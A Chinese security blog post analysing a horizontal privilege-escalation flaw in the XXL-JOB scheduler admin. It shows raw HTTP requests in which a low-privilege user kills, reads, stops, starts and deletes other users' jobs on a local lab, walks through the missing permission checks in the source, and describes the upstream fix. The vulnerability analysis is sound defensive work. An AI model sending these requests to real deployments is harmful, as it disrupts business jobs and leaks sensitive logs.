#  XXL-JOB 越权漏洞分析  
 蚁景网安   2026-10-13 08:59  
  
## 漏洞简介  
  
XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。 这次介绍的漏洞属于水平越权漏洞，简单来说就是，一个没有任何任务管理权限的用户，只要登录了系统后，就能构造请求来操作其他人的任务。  
  
受影响的接口包括：  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: #ffffff;"><th style="text-align: left;background-color: #f0f0f0;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;line-height: 1.6;background: #f0fdf4;color: #065f46;font-weight: 600;letter-spacing: 0.3px;min-width: 100px;"><section><span leaf="">接口路径</span></section></th><th style="text-align: left;background-color: #f0f0f0;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;line-height: 1.6;background: #f0fdf4;color: #065f46;font-weight: 600;letter-spacing: 0.3px;min-width: 100px;"><section><span leaf="">功能</span></section></th><th style="text-align: left;background-color: #f0f0f0;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;line-height: 1.6;background: #f0fdf4;color: #065f46;font-weight: 600;letter-spacing: 0.3px;min-width: 100px;"><section><span leaf="">危害</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: #ffffff;"><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><code><span leaf="">/joblog/logKill</span></code></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">终止正在执行的任务</span></section></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">中断业务流程</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #f8fafc;"><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><code><span leaf="">/joblog/logDetailCat</span></code></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">查看任务执行日志</span></section></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">泄露敏感信息</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #ffffff;"><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><code><span leaf="">/jobinfo/start</span></code></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">启动任务</span></section></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">可能触发非预期操作</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #f8fafc;"><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><code><span leaf="">/jobinfo/stop</span></code></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">停止任务</span></section></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">中断定时任务</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #ffffff;"><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><code><span leaf="">/jobinfo/remove</span></code></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">删除任务</span></section></td><td style="text-align: left;border: 1px solid #e2e8f0;padding: 10px 14px;font-size: 15px;color: #334155;line-height: 1.6;min-width: 100px;"><section><span leaf="">造成任务丢失</span></section></td></tr></tbody></table>  
  
‍  
  
XXL-JOB 的权限控制分两层：  
1. **全局拦截器**  
：通过 PermissionInterceptor  
 检查用户是否登录  
  
1. **方法级注解**  
：通过 @PermissionLimit  
 注解控制是否需要管理员权限  
  
问题出现于：在接口处既没有加 @PermissionLimit  
 注解要求管理员权限，方法内部也没有校验用户对具体任务的操作权限。  
  
‍  
  
‍  
## 漏洞验证&分析  
  
管理员登录后台并创建一个无任何权限的普通用户  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFrtVZXRvKSvU1AYMoQGEWZF3JbguYTw3pwMya1FPJn8fZqgpXzXC9Sg/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFsyCekO4Yqgd5ddHyWVLMOCqkdpemCfvcEn7y0Gdobs8SSy8bN6XYqw/640?wx_fmt=png&from=appmsg "")  
  
### 根据日志id 越权停止启动进程 logKill  
  
根据 https://developer.aliyun.com/article/1649153?spm=a2c6h.24874632.expert-profile.57.1c5939ad7RZU4e 创建一个 XXL-JOB 执行器，属于正常业务功能  
  
为了方便展示效果我们配置一个  jobTest1Handler  
```
@XxlJob("jobTest1Handler")    public void jobTest1Handler() {        try {            System.out.println("jobTest1Handler 开始执行 - " + new Date());            for (int i = 1; i <= 100000; i++) {                // 检查线程是否被中断                if (Thread.currentThread().isInterrupted()) {                    System.out.println("任务被中断，退出循环");                    return;                }                System.out.println("jobTest1Handler - 第" + i + "次执行 - 定时任务执行时间：" + new Date());                Thread.sleep(1000);            }            System.out.println("jobTest1Handler 执行完成 - " + new Date());        } catch (InterruptedException e) {            System.err.println("任务被中断：" + e.getMessage());            Thread.currentThread().interrupt();        }    }
```  
  
管理员登录后台后将任务部署并执行  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFSxpfgNc4zU9yB0dPV3JYfnP5Yp0mupnnN97pxtZfrDQlEp930A4JzA/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFeRkgcDxJ2gImKOfLWsJFibIqicDiakJgu8nQYVHsft4bQWfqPoJRPI6vA/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGF6azMGa45TSU9BHicmSYUBNiaoR1icBB2H0icod6hJqaWEZ3HOIpx3x45jQ/640?wx_fmt=png&from=appmsg "")  
  
  
‍  
  
我们看到执行器项目中已经开始执行并打印处日志信息  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFRhbtbO3oShVdctTkSpuicYxe5w4iajukIEQg9MjHUWcnTiaEZNRNcesHA/640?wx_fmt=png&from=appmsg "")  
  
  
此时我们登录普通用户的账号信息  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFndEwDDy3BCJfny1J0Eq2ictsUnEEhJW7HzE1BDcpd0sRJ7iag9Qw89VA/640?wx_fmt=png&from=appmsg "")  
  
  
是没有对任务调度的任何操作权限  
  
构造数据包  
  
‍  
```
GET /xxl-job-admin/joblog/logKill?id=1225 HTTP/1.1Host: 127.0.0.1:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8080/xxl-job-admin/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a226365736869222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a302c227065726d697373696f6e223a22227dConnection: close
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFk5yMfbgN2jBoZyvlUf7MXdnA5ql7A5MBDnc6WqJJLXDNVHKicLyFjCw/640?wx_fmt=png&from=appmsg "")  
  
  
执行的任务信息被中断  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFeOavsPAYvRhk7fvgkttbWic8ibdJh9kHY7icjklaeAPGibe85ZyXre1yXw/640?wx_fmt=png&from=appmsg "")  
  
  
此时对应的 id 1225 是 任务 job_id  5 对应此时启动的日志 id  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFT9cKNP6oGdGc0YxhFHd8WiaX7bBSicz6icDJdaKstl3v2cCJGfkqEVThw/640?wx_fmt=png&from=appmsg "")  
  
  
‍  
  
src/main/java/com/xxl/job/admin/controller/interceptor/WebMvcConfig.java  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFnjN1tsicv47wTXNvPDy3y9vbkTNHSCPeVPUIyrjRkG6cYQOYQdsWiaQg/640?wx_fmt=png&from=appmsg "")  
  
  
通过 WebMvcConfig 配置，PermissionInterceptor 作为全局拦截器对所有请求路径（/**）进行拦截。  
  
‍  
  
com.xxl.job.admin.controller.interceptor.PermissionInterceptor[#preHandle]()  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGF9hGIaSaf1x7ef0QAuGkhicrp9gAhhmk38rveSiagt6hCTlTtZEhrgTtw/640?wx_fmt=png&from=appmsg "")  
  
  
在 preHandle 方法中，拦截器会检查目标方法是否标注了 @PermissionLimit 注解来决定是否需要登录验证和管理员权限。如果需要登录，会调用 loginService.ifLogin() 验证用户身份，未登录用户会被重定向到登录页面；已登录用户信息会存储在 request 属性中供后续使用。  
  
‍  
  
com.xxl.job.admin.controller.JobLogController[#logKill]()  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFp78B6Pf70Vibnc0eeK0ibnjUF7iaicTAiczgvHmQ1ia0jUFuibbnI4CjHKl7A/640?wx_fmt=png&from=appmsg "")  
  
  
在 XXL-Job 的权限体系中，如果一个接口方法没有标注 @PermissionLimit 注解，那么该方法会受到全局 PermissionInterceptor 的默认保护，即要求用户必须登录（needLogin = true）但不要求管理员权限（needAdminuser = false）。因此 logKill 方法虽然需要登录验证，但任何普通登录用户都可以访问，这就形成了一个权限漏洞：普通用户可以终止任何任务，而不受 JobGroup 权限限制或管理员角色限制。正确的做法应该是在 logKill 方法中添加 PermissionInterceptor.validJobGroupPermission() 调用来验证用户对特定任务组的权限，或者要求管理员权限才能执行终止操作。  
  
‍  
### 根据日志id 越权查看日志信息 logDetailCat  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGF2PvmuDEzMc6QEaibz4eEDffNGgrhUHzWQKic6RqCtFKibYuicViaAHuUhXQ/640?wx_fmt=png&from=appmsg "")  
  
  
是没有对调度日志的任何操作权限  
  
普通用户登录后 构造数据包  
```
GET /xxl-job-admin/joblog/logDetailCat?logId=1225&fromLineNum=1 HTTP/1.1Host: 127.0.0.1:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8080/xxl-job-admin/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a226365736869222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a302c227065726d697373696f6e223a22227dConnection: close
```  
  
‍  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFeGbviaKENBhuE2OAVUMh50u5fZdOEgjlbbTTlJia5FvzgwibpUbLBibQxA/640?wx_fmt=png&from=appmsg "")  
  
  
现在看到的，是 XXL-JOB 框架的日志，信息量似乎不大。但是，如果这个任务的业务逻辑是这样的：  
```
@XxlJob("processOrderJob")public void processOrderJob() {    // 1. 从数据库查询待处理订单    Order order \= orderDao.getPendingOrder();    XxlJobHelper.log("开始处理订单，订单号：{}", order.getOrderId());    // 2. 调用第三方支付接口    PaymentResult result \= paymentService.process(order);    XxlJobHelper.log("支付接口返回，用户ID：{}，手机号：{}", order.getUserId(), order.getPhoneNumber());    // 3. 更新订单状态    orderDao.updateStatus(order.getOrderId(), "SUCCESS");    XxlJobHelper.log("订单处理完成，地址：{}", order.getAddress());}
```  
  
如果 logId=1 对应的是这样一个任务，那么通过 /logDetailCat 漏洞，获取到的 logContent 就会变成：  
  
开始处理订单，订单号：202508190001  
  
支付接口返回，用户ID：10086，手机号：13812345678  
  
订单处理完成，地址：上海市浦东新区xxx路xxx号  
  
‍  
  
这就是这个漏洞最直接、最严重的危害： 无论是否有权限，都可以实时窃取到系统中任意一个任务在执行过程中打印的任何信息，其中极有可能包含用户隐私、订单数据、内部接口参数等核心业务敏感信息。  
  
com.xxl.job.admin.controller.JobLogController[#logDetailCat]()  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFicDhr4YPJGFTf50pFh439pg6svS2UQB528hySVVNLrtg2FRuOeclZ4Q/640?wx_fmt=png&from=appmsg "")  
  
  
logDetailCat 方法存在权限设计缺陷。该方法没有标注 @PermissionLimit 注解，因此只受到全局权限拦截器的默认保护，仅要求用户登录但不验证具体权限。这意味着任何登录用户都可以通过传入任意的 logId 参数来查看任何任务的执行日志详情，包括不属于自己权限范围内的 JobGroup 的任务日志，从而可能泄露敏感的业务信息、配置参数或执行结果。正确的做法应该是在方法中添加 PermissionInterceptor.validJobGroupPermission(request, jobLog.getJobGroup()) 来验证用户是否有权限查看该任务所属组的日志信息  
  
‍  
  
‍  
  
‍  
### 根据任务id 越权启动、停止、删除任务  
  
根据 https://developer.aliyun.com/article/1649153?spm=a2c6h.24874632.expert-profile.57.1c5939ad7RZU4e 创建一个 XXL-JOB 执行器，属于正常业务功能  
  
为了方便展示效果我们配置一个  jobTestHandler  
```
    @XxlJob("jobTestHandler")    public void jobTestHandler() {        System.out.println("hello World!" + "- " + "定时任务执行时间：" +new Date());    }
```  
  
管理员登录后台后将任务部署并执行  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFSxpfgNc4zU9yB0dPV3JYfnP5Yp0mupnnN97pxtZfrDQlEp930A4JzA/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGF2r0ViaJLH8BdSeDfh2szoQvrcd7pYq1O6QNBOELEK8Cw5qrhic2h1AcQ/640?wx_fmt=png&from=appmsg "")  
  
  
‍  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGF7czYqkZQn8aOfwB5fCghe5MrPbErO6msyIlYzibmVdVNtNfQ5r2CRYw/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFFg86eZzyJmKI5fe28CpK3bzNnCHHsvHSV8J10ZiaDfx5saqViajyFFTA/640?wx_fmt=png&from=appmsg "")  
  
  
启动成功后 执行器项目中已经开始执行并打印处日志信息  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFoVO30bTR05Oxx7oH7WxH0qlEMdiaSzKtSX1J97xbb2fULLOF1iasRIRQ/640?wx_fmt=png&from=appmsg "")  
  
  
此时我们登录普通用户的账号信息  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFndEwDDy3BCJfny1J0Eq2ictsUnEEhJW7HzE1BDcpd0sRJ7iag9Qw89VA/640?wx_fmt=png&from=appmsg "")  
  
  
是没有对任务调度的任何操作权限  
  
以普通用户的权限构造数据包  
```
GET /xxl-job-admin/jobinfo/stop?id=4 HTTP/1.1Host: 127.0.0.1:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8080/xxl-job-admin/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a226365736869222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a302c227065726d697373696f6e223a22227dConnection: close
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFMS5tEGh6piaXB5uQDkKct2VJJnDSJ8MUv441sMdqH4BhRQNiaNDeyY0g/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFp8tNFZp23q5vDMmhYTlRGwY5cfIzXtgUMW6kI5cedjdMpibt8zIgIaA/640?wx_fmt=png&from=appmsg "")  
  
  
每秒执行的项目停止  
  
再构造数据包  
```
GET /xxl-job-admin/jobinfo/start?id=4 HTTP/1.1Host: 127.0.0.1:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8080/xxl-job-admin/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a226365736869222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a302c227065726d697373696f6e223a22227dConnection: close
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFRpCxPENM4RIK8wWFCGSEpFyM0kGEqM8ZQjt4IzalTax5hsGFurkQ5w/640?wx_fmt=png&from=appmsg "")  
  
  
项目重新启动成功  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFk9sBfzJFQ1ib3zqnCibIwKFlWHpXRPsuSmEBRSh4tdjmBy8kQ1YON1Og/640?wx_fmt=png&from=appmsg "")  
  
  
构造数据包  
```
GET /xxl-job-admin/jobinfo/remove?id=4 HTTP/1.1Host: 127.0.0.1:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8080/xxl-job-admin/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a226365736869222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a302c227065726d697373696f6e223a22227dConnection: close
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFzowCqPlrBFibeFo4IwspJb6HVAFrLNpFH7RaaxiaKnqI92rmx6C09egg/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFxVefaskaSsx3ibIzDoibNWmrHUjZ1XcHSv7qsRIHrOtE1HcCia6MO7GAA/640?wx_fmt=png&from=appmsg "")  
  
  
任务被删除  
  
src/main/java/com/xxl/job/admin/controller/JobInfoController.java  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFqAsmVSEFvraLGavNfmrf6a3sVt0icfZ6dFoZgbIgPtW8WTsGzeYt22Q/640?wx_fmt=png&from=appmsg "")  
  
  
src/main/java/com/xxl/job/admin/service/XxlJobService.java  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFGQAjlNE5z9bRuV8pHPseHsjicKc2lKn9ot3kibTJU0icyLJflH2jLsib4g/640?wx_fmt=png&from=appmsg "")  
  
  
‍  
  
com.xxl.job.admin.service.impl.XxlJobServiceImpl[#remove]()  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFDKDQttziaHD8f0yOmxxgV3Gwvic3WZxrsWicsuQoAwV3yvjiaa2icgeT4sg/640?wx_fmt=png&from=appmsg "")  
  
  
com.xxl.job.admin.service.impl.XxlJobServiceImpl[#start]()  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFkQ6PatyouKziaFiazmcWgXgmvdMsMuSauHDc2mubU6rjomhPcp0V9n7g/640?wx_fmt=png&from=appmsg "")  
  
  
com.xxl.job.admin.service.impl.XxlJobServiceImpl[#stop]()  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFCxYdVHb6ge5Yicrg7giaZr1wqcwh8bJicqC57RrZ7VsbAchriaSG9JXzlg/640?wx_fmt=png&from=appmsg "")  
  
  
remove、stop 和 start 三个方法都存在相同的权限设计缺陷。这些方法均没有标注 @PermissionLimit 注解，因此只受到全局权限拦截器的默认保护，仅要求用户登录但不验证具体权限。这意味着任何普通登录用户都可以对任意定时任务执行删除、停止或启动操作，完全绕过了 JobGroup 权限限制。其中 remove 方法的风险最高，允许用户删除任何任务及其相关数据；stop 和 start 方法则允许用户随意控制任务的执行状态，可能中断重要业务流程或启动危险任务。正确的做法应该是在这些方法中都添加 PermissionInterceptor.validJobGroupPermission() 调用来验证用户对目标任务所属组的权限，确保用户只能操作自己有权限管理的任务。  
  
‍  
## 漏洞修复  
  
修复的核心思路就是：在执行敏感操作之前，先验证当前登录用户是否对目标任务所属的 JobGroup 有操作权限。  
1. 在 Controller 层，对 remove、stop、start 方法增加了获取当前登录用户的逻辑  
  
1. 在 Service 层，对接口方法增加了 XxlJobUser loginUser  
 参数  
  
1. 在 ServiceImpl 层， 对 remove、stop、start 方法增加了权限校验逻辑 hasPermission  
  
‍  
  
https://github.com/xuxueli/xxl-job/pull/3792/commits/739d6a2483ce8f6c2a824098fbddb0f90087fba6  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGF54no15Bhdvn6qshIfUG3258ODr6qI3yCKia8m6xSY0JggciahojNVFgg/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGFEfRYMo7V1ncSat8gFd8y9JgVZ0TnFbEiaHnXF8nJMRpITloZcLiaKE9Q/640?wx_fmt=png&from=appmsg "")  
  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwh9eMsdxK3xnKicVvOxrwGF4xJ0arbqSPicWxExibiajkqxYTmC2psp9FEc72AEq00cpSX2Yl78Fxib8g/640?wx_fmt=png&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10 "")  
  
学  
习  
网安实战技术  
，戳  
“阅读原文”  
  
